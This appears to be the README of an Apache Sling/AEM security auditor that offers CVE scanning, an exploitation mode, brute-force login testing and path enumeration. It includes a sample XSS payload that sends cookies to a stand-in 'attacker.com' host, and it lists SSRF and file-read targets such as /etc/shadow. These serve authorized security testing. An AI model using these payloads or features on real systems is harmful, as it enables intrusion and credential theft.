# Apache Sling / AEM Security Auditor

A comprehensive, feature-rich security auditing tool designed for Apache Sling and Adobe Experience Manager (AEM) instances. This tool helps security professionals identify misconfigurations, vulnerabilities, and potential security weaknesses in Sling/AEM environments through automated scanning, exploitation testing, and detailed reporting.

![Version](https://img.shields.io/badge/version-2.0-blue)
![Python](https://img.shields.io/badge/python-3.7+-green)
![License](https://img.shields.io/badge/license-GPL--3.0-orange)
![GitHub](https://img.shields.io/badge/GitHub-Auditing--Korner-blue)
[![GitHub Pages](https://img.shields.io/badge/docs-GitHub%20Pages-blue)](https://auditing-korner.github.io/Apache-Sling-Auditor)

---

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Usage](#usage)
- [Scan Modes](#scan-modes)
- [Security Checks](#security-checks)
- [CVE Detection](#cve-detection)
- [Exploitation Capabilities](#exploitation-capabilities)
- [Brute Force Testing](#brute-force-testing)
- [Wordlist Enumeration](#wordlist-enumeration)
- [Configuration](#configuration)
- [Reporting](#reporting)
- [Command-Line Options](#command-line-options)
- [Repository Structure](#repository-structure)
- [Contributing](#contributing)
- [License](#license)
- [Disclaimer](#disclaimer)

---

## Features

### Core Capabilities

- **🔍 Multi-Mode Scanning**: Choose between `quick`, `full`, and `stealth` scan modes optimized for different scenarios
- **⚡ Asynchronous Scanning**: High-performance concurrent scanning using `asyncio` and `aiohttp`
- **🎯 Comprehensive CVE Detection**: Automated detection of 10+ known CVEs including Log4Shell, XSS, SSRF, Path Traversal, and Information Disclosure
- **💥 Active Exploitation**: Optional exploitation mode to generate PoCs and validate vulnerabilities
- **🔐 Brute Force Testing**: Automated login credential testing with configurable wordlists
- **📋 Path Enumeration**: Wordlist-based discovery of accessible paths and resources
- **📊 Detailed Reporting**: Rich console output and comprehensive JSON reports
- **🔧 Highly Configurable**: YAML-based configuration for all scan parameters, CVEs, and test payloads
- **🌐 Proxy Support**: Route traffic through HTTP/HTTPS proxies for testing
- **🔒 Authentication Support**: Basic authentication and form-based login testing

### Advanced Features

- **Version Detection**: Active and passive version identification with vulnerability correlation
- **API Enumeration**: Discovery of exposed API endpoints
- **Configuration Auditing**: OSGI console and Dispatcher configuration checks
- **Content Security Analysis**: Detection of sensitive path exposure
- **Rate Limiting**: Built-in delays to prevent overwhelming targets
- **Custom Headers**: Support for custom User-Agent, cookies, and headers
- **SSL/TLS Options**: Configurable SSL verification for testing environments

---

## Installation

### Prerequisites

- Python 3.7 or higher
- pip (Python package manager)

### Setup

```bash
# Clone the repository
git clone https://github.com/Auditing-Korner/Apache-Sling-Auditor.git
cd Apache-Sling-Auditor

# Create a virtual environment (recommended)
python -m venv venv

# Activate the environment
# On Linux/macOS:
source venv/bin/activate
# On Windows:
.\venv\Scripts\activate

# Install dependencies
pip install -r requirements.txt
```

### Dependencies

The tool requires the following Python packages (automatically installed via `requirements.txt`):

- `aiohttp` - Asynchronous HTTP client
- `requests` - HTTP library for synchronous requests
- `pyyaml` - YAML configuration parsing
- `beautifulsoup4` - HTML parsing
- `colorama` - Cross-platform colored terminal output
- `rich` - Advanced terminal formatting
- `tqdm` - Progress bars

---

## Quick Start

### Basic Scan

```bash
# Full scan of a target
python auditor.py -t http://example.com:4502
```

### Scan with Authentication

```bash
# Authenticated scan
python auditor.py -t https://secure.aem:4503 -u admin -p password
```

### Quick Security Check

```bash
# Fast scan focusing on critical vulnerabilities
python auditor.py -t http://example.com:4502 --mode quick
```

### Stealth Scan

```bash
# Low-profile scan with minimal requests
python auditor.py -t http://example.com:4502 --mode stealth
```

---

## Usage

### Basic Usage Patterns

**Standard Full Scan:**
```bash
python auditor.py -t http://target.com:4502 -v
```

**Scan with Wordlist Enumeration:**
```bash
python auditor.py -t http://target.com:4502 --wordlist wordlists/sling_paths.txt
```

**Exploitation Mode (Generate PoCs):**
```bash
python auditor.py -t http://target.com:4502 --exploit
```

**Brute Force Login Testing:**
```bash
python auditor.py -t http://target.com:4502 --brute-force \
  --username-wordlist wordlists/usernames.txt \
  --password-wordlist wordlists/passwords.txt
```

**Through Proxy:**
```bash
python auditor.py -t http://target.com:4502 --proxy http://127.0.0.1:8080
```

**Custom Configuration:**
```bash
python auditor.py -t http://target.com:4502 \
  --user-agent "Mozilla/5.0" \
  --cookies "session=abc123" \
  --timeout 15 \
  --threads 10
```

---

## Scan Modes

The auditor supports three distinct scan modes, each optimized for different scenarios:

### Quick Mode (`--mode quick`)

**Purpose**: Fast security assessment focusing on critical vulnerabilities

**Characteristics**:
- Maximum 10 requests per second
- 3 concurrent requests
- Only critical vulnerability checks
- Basic version detection
- Authentication checks
- Estimated duration: 1-3 minutes

**Use Cases**:
- Initial reconnaissance
- Quick security checks
- High-volume target scanning

**Example**:
```bash
python auditor.py -t http://target.com:4502 --mode quick
```

### Full Mode (`--mode full`) - Default

**Purpose**: Comprehensive security audit with all checks enabled

**Characteristics**:
- Maximum 20 requests per second
- 5 concurrent requests
- All vulnerability checks (critical, high, medium)
- Complete version detection (active + passive)
- Full authentication testing
- API endpoint enumeration
- Configuration auditing
- Content security analysis
- Estimated duration: 5-15 minutes

**Use Cases**:
- Complete security assessment
- Penetration testing
- Compliance auditing

**Example**:
```bash
python auditor.py -t http://target.com:4502 --mode full
```

### Stealth Mode (`--mode stealth`)

**Purpose**: Low-profile scanning with minimal footprint

**Characteristics**:
- Maximum 5 requests per second
- 2 concurrent requests
- Passive version detection only
- Safe checks (non-intrusive)
- Basic authentication checks
- Minimal error generation
- Estimated duration: 10-30 minutes

**Use Cases**:
- Covert security assessments
- Avoiding detection
- Testing rate limiting
- Production environment scanning

**Example**:
```bash
python auditor.py -t http://target.com:4502 --mode stealth
```

---

## Security Checks

The auditor performs comprehensive security checks across multiple categories:

### 1. Version Detection

**Active Detection**:
- Queries `/system/console/productinfo` for product information
- Checks `/libs/cq/core/content/welcome.html` for AEM version
- Analyzes version-specific endpoints

**Passive Detection**:
- Examines `Server` HTTP headers
- Analyzes `X-Powered-By` headers
- Extracts version information from error messages

**Vulnerability Correlation**:
- Matches detected versions against known CVEs
- Identifies affected versions from configuration
- Reports potential vulnerabilities based on version

### 2. Authentication Testing

**Default Credentials**:
- Tests common default credentials (admin/admin, author/author, etc.)
- Configurable credential list in `audit_config.yaml`
- Tests against authenticated endpoints

**Authentication Requirements**:
- Identifies paths requiring authentication (401/403 responses)
- Maps authentication-protected resources
- Analyzes authentication mechanisms

**Brute Force Testing** (with `--brute-force`):
- Automated credential testing
- Support for custom username/password wordlists
- Form-based and HTTP Basic authentication
- Rate limiting and lockout detection
- See [Brute Force Testing](#brute-force-testing) for details

### 3. Vulnerability Scanning

**CVE Detection**:
- Automated testing for 10+ known CVEs
- Specialized detection methods per vulnerability type
- Response analysis and pattern matching
- See [CVE Detection](#cve-detection) for complete list

**Custom Vulnerability Checks**:
- Configurable via `audit_config.yaml`
- Custom test paths, payloads, and parameters
- Severity-based prioritization

### 4. API Endpoint Enumeration

**Discovery**:
- Checks for exposed API endpoints
- Tests common Sling/AEM API paths
- Identifies publicly accessible APIs

**Common Endpoints Tested**:
- `/bin/querybuilder.json` - Query Builder API
- `/.json` - Content API
- `/system/console` - OSGI Console
- `/crx/de/index.jsp` - CRXDE Lite
- And many more (configurable)

### 5. Configuration Auditing

**OSGI Console Access**:
- Checks for exposed Felix Console
- Tests OSGI configuration endpoints
- Identifies misconfigured access controls

**Dispatcher Configuration**:
- Tests `/dispatcher/invalidate.cache` endpoint
- Checks for exposed cache invalidation
- Identifies configuration exposure

**System Configuration**:
- Analyzes system property exposure
- Checks for debug mode activation
- Identifies development configurations

### 6. Content Security Analysis

**Sensitive Path Detection**:
- Tests for exposed sensitive content paths
- Checks `/etc/passwords`, `/etc/keys`, `/home/users`
- Identifies publicly accessible sensitive data

**JCR Structure Analysis**:
- Analyzes JCR node accessibility
- Checks replication agent configurations
- Identifies permission misconfigurations

---

## CVE Detection

The auditor includes automated detection for the following CVEs:

### Critical Vulnerabilities

#### CVE-2021-44228 (Log4Shell)
- **Type**: Remote Code Execution (RCE)
- **Severity**: Critical
- **Detection**: Out-of-Band (OOB) testing via DNS/LDAP/RMI
- **Injection Points**: 15+ headers, 10+ parameters
- **Payloads**: Multiple variants (DNS, LDAP, obfuscated)
- **Features**:
  - Response time analysis
  - Pattern detection
  - Rate limiting
  - URL encoding support

#### CVE-2017-12617 (Path Traversal)
- **Type**: Path Traversal
- **Severity**: Critical
- **Detection**: File system access testing
- **Payloads**: Multiple encoding variants
- **Exploitation**: File reading capabilities

### High Severity Vulnerabilities

#### CVE-2020-11987 (SSRF)
- **Type**: Server-Side Request Forgery
- **Severity**: High
- **Detection**: Internal resource access testing
- **Exploitation**: Localhost, file system, AWS metadata access

#### CVE-2018-12809 (XSS)
- **Type**: Cross-Site Scripting
- **Severity**: Medium-High
- **Detection**: Payload injection and reflection analysis
- **Exploitation**: HTML PoC generation

### Medium Severity Vulnerabilities

#### CVE-2019-8086 (Information Disclosure)
- **Type**: Information Disclosure
- **Severity**: Medium
- **Detection**: Pattern matching in responses
- **Exploitation**: Data extraction (Java version, OS info)

#### CVE-2020-11984 (Path Traversal)
- **Type**: Path Traversal
- **Severity**: Medium
- **Detection**: File access testing

### Additional CVEs

- **CVE-2016-0957**: Apache Sling XSS
- **CVE-2017-12618**: Apache Sling SSRF
- **CVE-2018-8013**: Information Disclosure
- **CVE-2020-11985**: Path Traversal
- **CVE-2020-11986**: XSS

**Note**: All CVEs are configurable via `config/audit_config.yaml` with customizable test paths, payloads, and parameters.

---

## Exploitation Capabilities

When the `--exploit` flag is enabled, the auditor attempts to actively exploit detected vulnerabilities and generate proof-of-concept (PoC) files.

### XSS Exploitation

**Capabilities**:
- Generates HTML PoC files with JavaScript payloads
- Multiple payload variants (alert, cookie theft, keylogger)
- Saves PoC files to `scan_results/<timestamp>/exploits/CVE-*/xss_poc_*.html`

**Example Output**:
```html
<!-- XSS PoC for CVE-2018-12809 -->
<script>
  alert('XSS Vulnerability Confirmed');
  // Cookie theft payload
  document.location='http://attacker.com/steal?cookie='+document.cookie;
</script>
```

### SSRF Exploitation

**Capabilities**:
- Attempts to access internal resources (localhost, 127.0.0.1)
- Tests file system access (`file:///etc/passwd`)
- Tests AWS metadata endpoint access
- Reports successful internal resource access

**Test Targets**:
- `http://127.0.0.1:4502`
- `http://localhost/system/console`
- `file:///etc/passwd`
- `http://169.254.169.254/latest/meta-data/` (AWS)

### Path Traversal Exploitation

**Capabilities**:
- Attempts to read sensitive files
- Multiple encoding variants (URL, double encoding, etc.)
- Saves extracted file contents
- Reports successful file access

**Target Files**:
- `/etc/passwd`
- `/etc/shadow`
- `/etc/hosts`
- Application configuration files

### Information Disclosure Exploitation

**Capabilities**:
- Extracts Java version information
- Extracts OS information
- Extracts system properties
- Saves extracted data to files

**Extracted Information**:
- Java version and vendor
- Operating system details
- User home directory
- Java home directory
- System properties

### Exploit Output Structure

```
scan_results/
└── YYYYMMDD_HHMMSS/
    └── exploits/
        ├── CVE-2021-44228/
        │   └── log4shell_payloads.txt
        ├── CVE-2018-12809/
        │   ├── xss_poc_path1.html
        │   └── xss_poc_path2.html
        ├── CVE-2020-11987/
        │   └── ssrf_internal_access.txt
        └── CVE-2017-12617/
            └── extracted_etc_passwd.txt
```

---

## Brute Force Testing

The auditor includes comprehensive brute force testing capabilities for login mechanisms.

### Features

- **Multiple Authentication Methods**:
  - Form-based authentication (POST requests)
  - HTTP Basic Authentication
  - Automatic detection of authentication type

- **Configurable Wordlists**:
  - Default wordlists included (`wordlists/usernames.txt`, `wordlists/passwords.txt`)
  - Custom wordlist support via `--username-wordlist` and `--password-wordlist`
  - AEM-specific wordlists (`wordlists/aem_usernames.txt`)

- **Rate Limiting**:
  - Configurable delays between attempts
  - Prevents account lockouts
  - Respects server response times

- **Lockout Detection**:
  - Detects account lockout responses
  - Identifies rate limiting
  - Adjusts attack strategy

- **Success Indicators**:
  - Detects successful logins
  - Identifies session cookies
  - Reports valid credentials

### Usage

**Basic Brute Force:**
```bash
python auditor.py -t http://target.com:4502 --brute-force
```

**Custom Wordlists:**
```bash
python auditor.py -t http://target.com:4502 --brute-force \
  --username-wordlist /path/to/usernames.txt \
  --password-wordlist /path/to/passwords.txt
```

**Configuration** (in `audit_config.yaml`):
```yaml
brute_force:
  enabled: true
  login_endpoints:
    - /system/sling/login
    - /libs/granite/core/content/login.html
  default_usernames:
    - admin
    - author
    - anonymous
  default_passwords:
    - admin
    - password
    - 123456
  rate_limiting:
    max_attempts: 5
    delay_seconds: 2
  lockout_detection:
    enabled: true
    lockout_indicators:
      - "account locked"
      - "too many attempts"
```

### Results

Brute force results are included in the JSON report under `brute_force_results`:
- Valid credentials found
- Failed attempts
- Lockout detections
- Tested endpoints

---

## Wordlist Enumeration

The auditor supports wordlist-based path enumeration to discover accessible resources.

### Features

- **Concurrent Enumeration**: Fast parallel requests using async I/O
- **Response Categorization**:
  - **200 OK**: Publicly accessible (exposed)
  - **401 Unauthorized**: Requires authentication
  - **403 Forbidden**: Access denied
  - **404 Not Found**: Path does not exist

- **Custom Wordlists**: Support for any text-based wordlist file
- **Path Filtering**: Automatic filtering of invalid paths

### Usage

**Basic Wordlist Enumeration:**
```bash
python auditor.py -t http://target.com:4502 --wordlist wordlists/sling_paths.txt
```

**Extended Wordlist:**
```bash
python auditor.py -t http://target.com:4502 --wordlist wordlists/sling_paths_extended.txt
```

**Generate Custom Wordlist:**
```bash
python wordlists/generate_paths.py
# Generates wordlists/sling_paths_generated.txt
```

### Included Wordlists

- **sling_paths.txt**: Base wordlist (~193 paths)
- **sling_paths_extended.txt**: Extended wordlist (~463 paths)
- **sling_paths_generated.txt**: Auto-generated expanded wordlist (~47,000+ paths)

### Results

Wordlist enumeration results are included in the JSON report:
- Exposed paths (200 responses)
- Authentication-required paths (401 responses)
- Access-denied paths (403 responses)
- Statistics and summary

---

## Configuration

All scan behavior is configurable via `config/audit_config.yaml`.

### Configuration Structure

```yaml
# Scan modes
scan_modes:
  quick: { ... }
  full: { ... }
  stealth: { ... }

# Paths to check
paths:
  core_endpoints: [ ... ]
  api_endpoints: [ ... ]
  sensitive_paths: [ ... ]

# Default credentials
credentials: [ ... ]

# CVE definitions
vulnerabilities:
  CVE-2021-44228: { ... }
  CVE-2018-12809: { ... }
  # ... more CVEs

# Brute force settings
brute_force: { ... }

# Security check configurations
security_checks: { ... }
```

### Key Configuration Sections

1. **Scan Modes**: Request limits, concurrent requests, enabled checks
2. **Paths**: Endpoints to test with severity levels
3. **Credentials**: Default credentials for testing
4. **Vulnerabilities**: CVE definitions with test paths, payloads, parameters
5. **Brute Force**: Login endpoints, wordlists, rate limiting
6. **Security Checks**: Custom check configurations

### Customizing CVEs

Add or modify CVE definitions in `vulnerabilities` section:

```yaml
vulnerabilities:
  CVE-XXXX-XXXXX:
    name: Vulnerability Name
    type: xss|ssrf|path_traversal|info_disclosure|generic
    severity: critical|high|medium|low|info
    description: Vulnerability description
    affected_versions: "< 10.0"
    test_paths:
      - /path/to/test
    payloads:
      - payload1
      - payload2
    parameters:
      - param1
      - param2
    remediation: Fix instructions
```

---

## Reporting

The auditor generates comprehensive reports in multiple formats.

### Console Output

**Real-time Progress**:
- Color-coded severity levels (Critical=Red, High=Yellow, Medium=Cyan, Low=Green)
- Progress bars for each scan phase
- Live findings display

**Severity Colors**:
- 🔴 **Critical**: Red
- 🟡 **High**: Yellow
- 🔵 **Medium**: Cyan
- 🟢 **Low**: Green
- ⚪ **Info**: White

### JSON Reports

**Location**: `scan_results/<timestamp>/detailed_report.json`

**Structure**:
```json
{
  "scan_info": {
    "target": "http://target.com:4502",
    "mode": "full",
    "start_time": "2024-01-01T12:00:00",
    "duration": 123.45,
    "total_requests": 500
  },
  "findings": [
    {
      "name": "Vulnerability Name",
      "severity": "critical",
      "path": "/path/to/vulnerability",
      "description": "...",
      "cve": "CVE-2021-44228",
      "remediation": "..."
    }
  ],
  "version_info": { ... },
  "authentication_results": { ... },
  "vulnerability_results": { ... },
  "api_results": { ... },
  "configuration_results": { ... },
  "content_security_results": { ... },
  "wordlist_results": { ... },
  "brute_force_results": { ... },
  "exploit_results": { ... }
}
```

### Report Contents

- **Scan Information**: Target, mode, duration, statistics
- **Findings**: All discovered vulnerabilities and issues
- **Version Information**: Detected versions and correlated CVEs
- **Authentication Results**: Default credential tests, protected paths
- **Vulnerability Results**: CVE detection results
- **API Results**: Exposed API endpoints
- **Configuration Results**: Misconfiguration findings
- **Content Security Results**: Sensitive path exposure
- **Wordlist Results**: Enumeration findings
- **Brute Force Results**: Credential testing results
- **Exploit Results**: Exploitation outcomes (if `--exploit` used)

---

## Command-Line Options

### Required Arguments

| Option | Description |
|--------|-------------|
| `-t, --target` | Target URL (e.g., `http://example.com:4502`) |

### Optional Arguments

| Option | Description | Default |
|--------|-------------|---------|
| `-u, --username` | Username for authentication | None |
| `-p, --password` | Password for authentication | None |
| `-o, --output` | Output directory for scan results | `scan_results` |
| `-T, --timeout` | Request timeout in seconds | `10` |
| `-k, --insecure` | Allow insecure SSL connections | `False` |
| `-v, --verbose` | Enable verbose output | `False` |
| `--threads` | Number of concurrent threads | `5` |
| `--proxy` | Proxy URL (e.g., `http://127.0.0.1:8080`) | None |
| `--mode` | Scan mode: `quick`, `full`, or `stealth` | `full` |
| `--user-agent` | Custom User-Agent string | Default browser UA |
| `--cookies` | Cookies (e.g., `"key1=val1; key2=val2"`) | None |
| `--wordlist` | Path to wordlist file for enumeration | None |
| `--exploit` | Enable exploitation mode | `False` |
| `--brute-force` | Enable brute force login testing | `False` |
| `--username-wordlist` | Path to username wordlist | Default |
| `--password-wordlist` | Path to password wordlist | Default |
| `-h, --help` | Show help message | - |

### Examples

**Full scan with all features:**
```bash
python auditor.py -t http://target.com:4502 \
  --mode full \
  --exploit \
  --brute-force \
  --wordlist wordlists/sling_paths_extended.txt \
  --username-wordlist wordlists/aem_usernames.txt \
  --password-wordlist wordlists/common_passwords.txt \
  --verbose \
  --threads 10 \
  --timeout 15
```

**Stealth scan through proxy:**
```bash
python auditor.py -t https://target.com:4503 \
  --mode stealth \
  --proxy http://127.0.0.1:8080 \
  --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
  --cookies "session=abc123; token=xyz789"
```

**Quick authenticated scan:**
```bash
python auditor.py -t http://target.com:4502 \
  --mode quick \
  -u admin \
  -p password \
  -v
```

---

## Repository Structure

```
Apache-Sling-Auditor/
├── auditor.py                    # Main auditor application
├── requirements.txt              # Python dependencies
├── README.md                     # This file
├── LICENSE                       # GPL-3.0 License
├── CONTRIBUTING.md              # Contribution guidelines
├── .gitignore                   # Git ignore rules
├── .gitattributes               # Git file handling
│
├── config/                       # Configuration directory
│   └── audit_config.yaml        # Main configuration file
│       ├── Scan modes
│       ├── CVE definitions
│       ├── Path lists
│       ├── Default credentials
│       ├── Brute force settings
│       └── Security check configs
│
├── wordlists/                    # Wordlists directory
│   ├── usernames.txt            # General username wordlist
│   ├── aem_usernames.txt        # AEM-specific usernames
│   ├── passwords.txt            # Password wordlist
│   ├── common_passwords.txt     # Common weak passwords
│   ├── sling_paths.txt          # Base path wordlist
│   ├── sling_paths_extended.txt # Extended path wordlist
│   ├── sling_paths_generated.txt # Generated (gitignored)
│   ├── security_headers.txt     # Security headers
│   ├── generate_paths.py        # Path generator script
│   └── header_test.py          # Header testing script
│
├── scan_results/                 # Scan outputs (GITIGNORED)
│   └── YYYYMMDD_HHMMSS/        # Timestamped directories
│       ├── detailed_report.json # JSON report
│       └── exploits/            # Exploit outputs (if --exploit)
│
└── docs/                         # Documentation
    ├── STRUCTURE.md             # Repository structure
    └── REPOSITORY_ORGANIZATION.md # Organization guide
```

**Important**: All scan results, reports, and extracted data are automatically excluded from Git via `.gitignore` to prevent accidental commits of sensitive information.

---

## Contributing

Contributions are welcome! Please follow these guidelines:

1. **Fork the repository** and create a feature branch
2. **Review `CONTRIBUTING.md`** for detailed guidelines
3. **Never commit scan results** - All outputs are gitignored
4. **Test your changes** thoroughly before submitting
5. **Update documentation** as needed
6. **Submit a Pull Request** with a clear description

### Before Contributing

- ✅ Review `CONTRIBUTING.md` for guidelines
- ✅ Verify `git status` shows no scan_results
- ✅ Test your changes on authorized systems only
- ✅ Update documentation if adding features

See `CONTRIBUTING.md` for complete contribution guidelines.

---

## License

This project is licensed under the GPL-3.0 License - see the [LICENSE](LICENSE) file for details.

**Repository**: [https://github.com/Auditing-Korner/Apache-Sling-Auditor](https://github.com/Auditing-Korner/Apache-Sling-Auditor)

---

## Disclaimer

**⚠️ FOR EDUCATIONAL AND AUTHORIZED USE ONLY ⚠️**

This tool is intended for security auditing and testing purposes by **authorized personnel only**. 

- **Unauthorized scanning of systems is illegal and unethical**
- **Always obtain explicit written permission** from the system owner before conducting any security assessments
- **The developers assume no liability** and are not responsible for any misuse or damage caused by this tool
- **Use responsibly** and in accordance with applicable laws and regulations
- **Do not use this tool** to access systems you do not own or have explicit permission to test

By using this tool, you agree to use it only for legitimate security testing purposes and accept full responsibility for your actions.

---

## Support

For issues, questions, or contributions:

- **Repository**: [https://github.com/Auditing-Korner/Apache-Sling-Auditor](https://github.com/Auditing-Korner/Apache-Sling-Auditor)
- **Issues**: [Open an issue on GitHub](https://github.com/Auditing-Korner/Apache-Sling-Auditor/issues)
- **Contributions**: [Submit a Pull Request](https://github.com/Auditing-Korner/Apache-Sling-Auditor/pulls)
- **Documentation**: See `docs/` directory or [GitHub Pages](https://auditing-korner.github.io/Apache-Sling-Auditor)

---

## Author

**Ruben Silva**

- **LinkedIn**: [https://www.linkedin.com/in/ruben-silva85/](https://www.linkedin.com/in/ruben-silva85/)
- **GitHub**: [Auditing-Korner](https://github.com/Auditing-Korner)
- **Patreon**: [https://www.patreon.com/cw/rfs85](https://www.patreon.com/cw/rfs85) - Support cybersecurity research and get exclusive content

**Made with ❤️ for the security community**
